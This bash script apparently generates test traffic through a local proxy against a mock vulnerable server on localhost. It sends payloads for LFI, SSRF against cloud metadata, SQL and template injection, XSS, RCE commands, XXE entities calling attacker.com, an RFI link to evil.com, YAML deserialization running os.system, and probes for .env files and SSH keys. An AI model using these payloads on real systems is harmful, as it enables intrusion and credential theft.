#!/bin/bash

# ==========================================
# COMPREHENSIVE VULNERABILITY SCANNER
# Tests all mock vulnerabilities through proxy
# ==========================================

PROXY_HOST="127.0.0.1"
PROXY_PORT="9095"
TARGET_HOST="localhost"
TARGET_PORT="8000"
TARGET_BASE="http://$TARGET_HOST:$TARGET_PORT"

# Colors
GREEN='\033[0;32m'
RED='\033[0;31m'
BLUE='\033[0;34m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
NC='\033[0m'

# Counters
TOTAL=0
SUCCESS=0
FAILED=0

echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║   🎯 PROXXY VULNERABILITY SCANNER                         ║${NC}"
echo -e "${CYAN}║   Testing all endpoints through MITM Proxy                ║${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}Proxy:  $PROXY_HOST:$PROXY_PORT${NC}"
echo -e "${BLUE}Target: $TARGET_BASE${NC}"
echo ""

# Test function
test_endpoint() {
    METHOD=$1
    PATH=$2
    DESC=$3
    DATA=$4
    CATEGORY=$5
    
    TOTAL=$((TOTAL + 1))
    URL="$TARGET_BASE$PATH"
    
    echo -ne "${CATEGORY} ${YELLOW}[$TOTAL]${NC} ${METHOD} ${PATH} "
    
    # Simple curl without subshell complexity
    if [ "$METHOD" == "POST" ]; then
        HTTP_CODE=$(/usr/bin/curl -x http://$PROXY_HOST:$PROXY_PORT -s -o /dev/null -w "%{http_code}" -X POST -H "Content-Type: application/json" -d "$DATA" "$URL")
    elif [ "$METHOD" == "DELETE" ]; then
        HTTP_CODE=$(/usr/bin/curl -x http://$PROXY_HOST:$PROXY_PORT -s -o /dev/null -w "%{http_code}" -X DELETE "$URL")
    else
        HTTP_CODE=$(/usr/bin/curl -x http://$PROXY_HOST:$PROXY_PORT -s -o /dev/null -w "%{http_code}" "$URL")
    fi

    if [[ "$HTTP_CODE" =~ ^[2-4] ]]; then
        echo -e "[${GREEN}$HTTP_CODE${NC}] ✅ $DESC"
        SUCCESS=$((SUCCESS + 1))
    else
        echo -e "[${RED}$HTTP_CODE${NC}] ❌ $DESC"
        FAILED=$((FAILED + 1))
    fi
    
    /bin/sleep 0.1
}

# ==========================================
# CATEGORY 1: PERFORMANCE BENCHMARKS
# ==========================================
echo -e "\n${MAGENTA}═══ 1. PERFORMANCE BENCHMARKS ═══${NC}"
test_endpoint "GET" "/" "Homepage" "" "🔥"
test_endpoint "GET" "/test" "Benchmark endpoint" "" "🔥"
test_endpoint "GET" "/health" "Health check" "" "🔥"
test_endpoint "GET" "/ping" "Ping endpoint" "" "🔥"

# ==========================================
# CATEGORY 2: SENSITIVE FILE EXPOSURE
# ==========================================
echo -e "\n${MAGENTA}═══ 2. SENSITIVE FILE EXPOSURE ═══${NC}"
test_endpoint "GET" "/.env" ".env file" "" "📂"
test_endpoint "GET" "/.env.backup" ".env.backup" "" "📂"
test_endpoint "GET" "/.env.local" ".env.local" "" "📂"
test_endpoint "GET" "/.env.production" ".env.production" "" "📂"
test_endpoint "GET" "/config.json" "config.json" "" "📂"
test_endpoint "GET" "/config.yml" "config.yml" "" "📂"
test_endpoint "GET" "/appsettings.json" "appsettings.json" "" "📂"
test_endpoint "GET" "/.git/config" "Git config" "" "📂"
test_endpoint "GET" "/.git/HEAD" "Git HEAD" "" "📂"
test_endpoint "GET" "/.git/index" "Git index" "" "📂"
test_endpoint "GET" "/.gitignore" ".gitignore" "" "📂"
test_endpoint "GET" "/backup.sql" "SQL backup" "" "📂"
test_endpoint "GET" "/database.sql" "Database dump" "" "📂"
test_endpoint "GET" "/dump.sql" "Dump file" "" "📂"
test_endpoint "GET" "/phpinfo.php" "phpinfo()" "" "📂"
test_endpoint "GET" "/info.php" "info.php" "" "📂"
test_endpoint "GET" "/server-status" "Server status" "" "📂"
test_endpoint "GET" "/robots.txt" "robots.txt" "" "📂"
test_endpoint "GET" "/.htaccess" ".htaccess" "" "📂"
test_endpoint "GET" "/.htpasswd" ".htpasswd" "" "📂"
test_endpoint "GET" "/web.config" "web.config" "" "📂"
test_endpoint "GET" "/.DS_Store" ".DS_Store" "" "📂"
test_endpoint "GET" "/package.json" "package.json" "" "📂"
test_endpoint "GET" "/composer.json" "composer.json" "" "📂"
test_endpoint "GET" "/Gemfile" "Gemfile" "" "📂"
test_endpoint "GET" "/requirements.txt" "requirements.txt" "" "📂"
test_endpoint "GET" "/yarn.lock" "yarn.lock" "" "📂"
test_endpoint "GET" "/.npmrc" ".npmrc" "" "📂"
test_endpoint "GET" "/credentials.json" "credentials.json" "" "📂"
test_endpoint "GET" "/id_rsa" "SSH private key" "" "📂"
test_endpoint "GET" "/.ssh/id_rsa" "SSH key (alt)" "" "📂"
test_endpoint "GET" "/id_rsa.pub" "SSH public key" "" "📂"
test_endpoint "GET" "/access.log" "Access log" "" "📂"
test_endpoint "GET" "/error.log" "Error log" "" "📂"
test_endpoint "GET" "/application.log" "Application log" "" "📂"
test_endpoint "GET" "/console.log" "Console log" "" "📂"

# ==========================================
# CATEGORY 3: INJECTION VULNERABILITIES
# ==========================================
echo -e "\n${MAGENTA}═══ 3. INJECTION ATTACKS ═══${NC}"
test_endpoint "GET" "/vuln/lfi?file=../../../etc/passwd" "LFI - Unix" "" "💉"
test_endpoint "GET" "/vuln/lfi?file=../../windows/win.ini" "LFI - Windows" "" "💉"
test_endpoint "GET" "/vuln/rfi?url=http://evil.com/shell.txt" "RFI" "" "💉"
test_endpoint "GET" "/vuln/ssrf?url=http://169.254.169.254/latest/meta-data/" "SSRF - AWS" "" "💉"
test_endpoint "GET" "/vuln/ssrf?url=http://metadata.google.internal" "SSRF - GCP" "" "💉"
test_endpoint "GET" "/vuln/ssti?name={{7*7}}" "SSTI - Jinja2" "" "💉"
test_endpoint "GET" "/vuln/ssti?name=\${7*7}" "SSTI - Freemarker" "" "💉"
test_endpoint "GET" "/vuln/ssti?name={{config}}" "SSTI - Config leak" "" "💉"
test_endpoint "GET" "/vuln/xss?q=<script>alert('XSS')</script>" "XSS - Reflected" "" "💉"
test_endpoint "GET" "/vuln/dom-xss" "XSS - DOM based" "" "💉"
test_endpoint "GET" "/vuln/sqli?id=1' OR '1'='1" "SQLi - Error based" "" "💉"
test_endpoint "GET" "/vuln/sqli?id=1' AND 1=1--" "SQLi - Boolean" "" "💉"
test_endpoint "GET" "/vuln/sqli-blind?id=1 AND 1=1" "SQLi - Blind" "" "💉"
test_endpoint "GET" "/vuln/sqli-time?id=1' AND SLEEP(5)--" "SQLi - Time based" "" "💉"
test_endpoint "GET" "/vuln/nosqli?username={\$ne:null}" "NoSQLi" "" "💉"
test_endpoint "GET" "/vuln/rce?cmd=whoami" "RCE - whoami" "" "💉"
test_endpoint "GET" "/vuln/rce?cmd=id" "RCE - id" "" "💉"
test_endpoint "GET" "/vuln/rce?cmd=uname -a" "RCE - uname" "" "💉"
test_endpoint "POST" "/vuln/xxe" "XXE - Basic" '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' "💉"
test_endpoint "POST" "/vuln/xxe-blind" "XXE - Blind" '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com">]>' "💉"
test_endpoint "POST" "/vuln/xxe-oob" "XXE - OOB" '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com">]>' "💉"
test_endpoint "GET" "/vuln/xpath?user=admin' or '1'='1" "XPath Injection" "" "💉"
test_endpoint "GET" "/vuln/ldap?username=*)(uid=*" "LDAP Injection" "" "💉"
test_endpoint "GET" "/vuln/path-traversal?path=../../../etc/passwd" "Path Traversal" "" "💉"
test_endpoint "GET" "/vuln/cmd-injection?cmd=ls;whoami" "Command Injection" "" "💉"
test_endpoint "GET" "/vuln/code-injection?q=eval('malicious')" "Code Injection" "" "💉"
test_endpoint "GET" "/vuln/template-injection?template={{7*7}}" "Template Injection" "" "💉"
test_endpoint "GET" "/vuln/crlf?q=test%0d%0aInjected-Header:value" "CRLF Injection" "" "💉"
test_endpoint "GET" "/vuln/header-injection?q=malicious" "Header Injection" "" "💉"

# ==========================================
# CATEGORY 4: AUTHENTICATION & AUTHORIZATION
# ==========================================
echo -e "\n${MAGENTA}═══ 4. AUTHENTICATION ISSUES ═══${NC}"
test_endpoint "POST" "/login" "Login" '{"username":"test","password":"test"}' "🔐"
test_endpoint "POST" "/admin/login" "Admin login" '{"username":"admin","password":"admin"}' "🔐"
test_endpoint "POST" "/api/login" "API login" '{"username":"user","password":"pass"}' "🔐"
test_endpoint "GET" "/vuln/auth-bypass?username=admin' OR '1'='1" "Auth bypass" "" "🔐"
test_endpoint "POST" "/vuln/default-creds" "Default creds" '{"username":"admin","password":"admin"}' "🔐"
test_endpoint "POST" "/vuln/weak-password" "Weak password" '{"username":"user","password":"123456"}' "🔐"
test_endpoint "GET" "/vuln/jwt-none" "JWT - none algorithm" "" "🔐"
test_endpoint "GET" "/vuln/jwt-weak" "JWT - weak secret" "" "🔐"
test_endpoint "GET" "/vuln/session-fixation?id=attacker_session" "Session fixation" "" "🔐"
test_endpoint "POST" "/vuln/password-reset" "Password reset" '{"email":"admin@test.com"}' "🔐"
test_endpoint "GET" "/api/admin/users" "Broken auth" "" "🔐"
test_endpoint "GET" "/admin/dashboard" "Admin panel" "" "🔐"
test_endpoint "GET" "/admin/console" "Admin console" "" "🔐"

# ==========================================
# CATEGORY 5: IDOR & ACCESS CONTROL
# ==========================================
echo -e "\n${MAGENTA}═══ 5. IDOR & ACCESS CONTROL ═══${NC}"
test_endpoint "GET" "/api/users/1" "User profile - Normal" "" "🎯"
test_endpoint "GET" "/api/users/999" "User profile - Admin" "" "🎯"
test_endpoint "GET" "/api/user/profile/999" "IDOR - Profile" "" "🎯"
test_endpoint "GET" "/api/orders/12345" "IDOR - Orders" "" "🎯"
test_endpoint "GET" "/api/documents/secret" "IDOR - Documents" "" "🎯"
test_endpoint "GET" "/vuln/forceful-browsing" "Forceful browsing" "" "🎯"
test_endpoint "POST" "/vuln/privilege-escalation" "Privilege escalation" '{"role":"admin"}' "🎯"
test_endpoint "DELETE" "/api/delete-user/999" "Delete without auth" "" "🎯"

# ==========================================
# CATEGORY 6: BUSINESS LOGIC FLAWS
# ==========================================
echo -e "\n${MAGENTA}═══ 6. BUSINESS LOGIC FLAWS ═══${NC}"
test_endpoint "POST" "/api/transfer" "Mass assignment" '{"amount":1000,"is_admin":true}' "💼"
test_endpoint "POST" "/api/checkout" "Price manipulation" '{"price":0.01}' "💼"
test_endpoint "POST" "/api/coupon" "Coupon abuse" '{"code":"UNLIMITED100"}' "💼"
test_endpoint "POST" "/api/race-condition" "Race condition" '{"action":"withdraw"}' "💼"
test_endpoint "POST" "/api/vote" "Vote manipulation" '{"votes":9999}' "💼"
test_endpoint "POST" "/api/2fa/disable" "2FA bypass" '{"user_id":1}' "💼"

# ==========================================
# CATEGORY 7: REDIRECTS & URL ISSUES
# ==========================================
echo -e "\n${MAGENTA}═══ 7. OPEN REDIRECTS ═══${NC}"
test_endpoint "GET" "/redirect?to=https://evil.com" "Open redirect" "" "🔗"
test_endpoint "GET" "/vuln/open-redirect?url=http://attacker.com" "Open redirect (alt)" "" "🔗"
test_endpoint "GET" "/vuln/url-redirect?to=javascript:alert(1)" "URL redirect - XSS" "" "🔗"
test_endpoint "GET" "/vuln/host-header" "Host header injection" "" "🔗"

# ==========================================
# CATEGORY 8: CORS & CSP
# ==========================================
echo -e "\n${MAGENTA}═══ 8. CORS & CSP ISSUES ═══${NC}"
test_endpoint "GET" "/api/cors" "CORS - Reflected origin" "" "🌐"
test_endpoint "GET" "/api/cors-wildcard" "CORS - Wildcard" "" "🌐"
test_endpoint "GET" "/vuln/jsonp?callback=evil" "JSONP callback" "" "🌐"
test_endpoint "GET" "/vuln/postmessage" "PostMessage vuln" "" "🌐"

# ==========================================
# CATEGORY 9: FILE UPLOAD
# ==========================================
echo -e "\n${MAGENTA}═══ 9. FILE UPLOAD VULNERABILITIES ═══${NC}"
test_endpoint "POST" "/api/upload" "File upload" '{"file":"shell.php"}' "📤"
test_endpoint "POST" "/vuln/upload-unrestricted" "Unrestricted upload" '{"file":"malware.exe"}' "📤"
test_endpoint "POST" "/vuln/upload-path-traversal" "Upload traversal" '{"filename":"../../../tmp/shell.php"}' "📤"
test_endpoint "POST" "/vuln/zip-slip" "Zip slip" '{"archive":"malicious.zip"}' "📤"

# ==========================================
# CATEGORY 10: DESERIALIZATION
# ==========================================
echo -e "\n${MAGENTA}═══ 10. DESERIALIZATION ATTACKS ═══${NC}"
test_endpoint "POST" "/vuln/deserialization" "Deserialization" 'O:8:"Evil":1:{s:4:"code";s:10:"phpinfo();";}' "🔓"
test_endpoint "POST" "/vuln/pickle" "Python pickle" 'pickle_payload' "🔓"
test_endpoint "POST" "/vuln/yaml" "YAML deserialization" '!!python/object/apply:os.system ["whoami"]' "🔓"

# ==========================================
# CATEGORY 11: API VULNERABILITIES
# ==========================================
echo -e "\n${MAGENTA}═══ 11. API VULNERABILITIES ═══${NC}"
test_endpoint "GET" "/api/debug" "Debug endpoint" "" "🔌"
test_endpoint "GET" "/api/v1/users" "Mass data exposure" "" "🔌"
test_endpoint "POST" "/api/graphql" "GraphQL introspection" '{"query":"{__schema{types{name}}}"}' "🔌"
test_endpoint "GET" "/api/swagger.json" "Swagger spec" "" "🔌"
test_endpoint "GET" "/api-docs" "API docs" "" "🔌"
test_endpoint "GET" "/v2/api-docs" "API docs v2" "" "🔌"
test_endpoint "GET" "/swagger-ui.html" "Swagger UI" "" "🔌"
test_endpoint "GET" "/api/trace" "API trace" "" "🔌"

# ==========================================
# CATEGORY 12: RATE LIMITING & DOS
# ==========================================
echo -e "\n${MAGENTA}═══ 12. RATE LIMITING & DOS ═══${NC}"
test_endpoint "POST" "/vuln/no-rate-limit" "No rate limit" '{"action":"spam"}' "⏱️"
test_endpoint "GET" "/vuln/regex-dos?q=aaaaaaaaaaaaaaaaaaaaaaaaaaaa!" "ReDoS" "" "⏱️"
test_endpoint "POST" "/vuln/xml-bomb" "XML bomb" '<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;">]><lolz>&lol2;</lolz>' "⏱️"

# ==========================================
# CATEGORY 13: CRYPTOGRAPHIC ISSUES
# ==========================================
echo -e "\n${MAGENTA}═══ 13. CRYPTOGRAPHIC WEAKNESSES ═══${NC}"
test_endpoint "GET" "/vuln/weak-random" "Weak random" "" "🔑"
test_endpoint "GET" "/vuln/predictable-token" "Predictable token" "" "🔑"
test_endpoint "GET" "/vuln/insecure-cookie" "Insecure cookie" "" "🔑"

# ==========================================
# CATEGORY 14: INFORMATION DISCLOSURE
# ==========================================
echo -e "\n${MAGENTA}═══ 14. INFORMATION DISCLOSURE ═══${NC}"
test_endpoint "GET" "/vuln/stack-trace" "Stack trace" "" "ℹ️"
test_endpoint "GET" "/vuln/verbose-error" "Verbose error" "" "ℹ️"
test_endpoint "GET" "/vuln/git-exposure" "Git exposure" "" "ℹ️"
test_endpoint "GET" "/vuln/backup-files" "Backup files" "" "ℹ️"
test_endpoint "GET" "/.svn/entries" "SVN entries" "" "ℹ️"
test_endpoint "GET" "/WEB-INF/web.xml" "WEB-INF" "" "ℹ️"
test_endpoint "GET" "/META-INF/MANIFEST.MF" "META-INF" "" "ℹ️"

# ==========================================
# CATEGORY 15: CLICKJACKING
# ==========================================
echo -e "\n${MAGENTA}═══ 15. CLICKJACKING ═══${NC}"
test_endpoint "GET" "/vuln/clickjacking" "Clickjacking" "" "🖱️"
test_endpoint "GET" "/vuln/ui-redressing" "UI redressing" "" "🖱️"

# ==========================================
# CATEGORY 16: SECURITY HEADERS
# ==========================================
echo -e "\n${MAGENTA}═══ 16. SECURITY HEADERS ═══${NC}"
test_endpoint "GET" "/insecure-headers" "Insecure headers" "" "🛡️"
test_endpoint "GET" "/missing-csp" "Missing CSP" "" "🛡️"
test_endpoint "GET" "/weak-tls" "Weak TLS" "" "🛡️"

# ==========================================
# CATEGORY 17: WORDPRESS/CMS
# ==========================================
echo -e "\n${MAGENTA}═══ 17. WORDPRESS/CMS ═══${NC}"
test_endpoint "GET" "/wp-admin/" "WP Admin" "" "📝"
test_endpoint "GET" "/wp-login.php" "WP Login" "" "📝"
test_endpoint "GET" "/wp-config.php" "WP Config" "" "📝"
test_endpoint "GET" "/wp-includes/" "WP Includes" "" "📝"
test_endpoint "POST" "/xmlrpc.php" "XMLRPC" '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' "📝"

# ==========================================
# CATEGORY 18: SERVER MISCONFIGURATIONS
# ==========================================
echo -e "\n${MAGENTA}═══ 18. SERVER MISCONFIGURATIONS ═══${NC}"
test_endpoint "GET" "/server-info" "Server info" "" "⚙️"
test_endpoint "GET" "/.well-known/security.txt" "security.txt" "" "⚙️"
test_endpoint "GET" "/trace" "HTTP TRACE" "" "⚙️"
test_endpoint "GET" "/debug" "Debug mode" "" "⚙️"

# ==========================================
# CATEGORY 19: CLOUD METADATA
# ==========================================
echo -e "\n${MAGENTA}═══ 19. CLOUD METADATA ═══${NC}"
test_endpoint "GET" "/latest/meta-data/" "AWS metadata" "" "☁️"
test_endpoint "GET" "/computeMetadata/v1/" "GCP metadata" "" "☁️"
test_endpoint "GET" "/metadata/instance" "Azure metadata" "" "☁️"

# ==========================================
# CATEGORY 20: SOAP
# ==========================================
echo -e "\n${MAGENTA}═══ 20. SOAP/XML SERVICES ═══${NC}"
test_endpoint "POST" "/api/soap" "SOAP endpoint" '<?xml version="1.0"?><soap:Envelope><soap:Body><test/></soap:Body></soap:Envelope>' "🧼"

# ==========================================
# SUMMARY
# ==========================================
echo ""
echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
echo -e "${CYAN}║                    TEST SUMMARY                            ║${NC}"
echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
echo -e "${CYAN}║${NC}  Total Tests:     ${YELLOW}$TOTAL${NC}"
echo -e "${CYAN}║${NC}  Successful:      ${GREEN}$SUCCESS${NC}"
echo -e "${CYAN}║${NC}  Failed:          ${RED}$FAILED${NC}"
echo -e "${CYAN}║${NC}  Success Rate:    ${GREEN}$(python3 -c "print(f'{($SUCCESS/$TOTAL)*100:.1f}%')" 2>/dev/null || echo 'N/A')${NC}"
echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
echo ""
echo -e "${BLUE}💡 Check your Proxxy Dashboard to see all captured traffic!${NC}"
echo ""
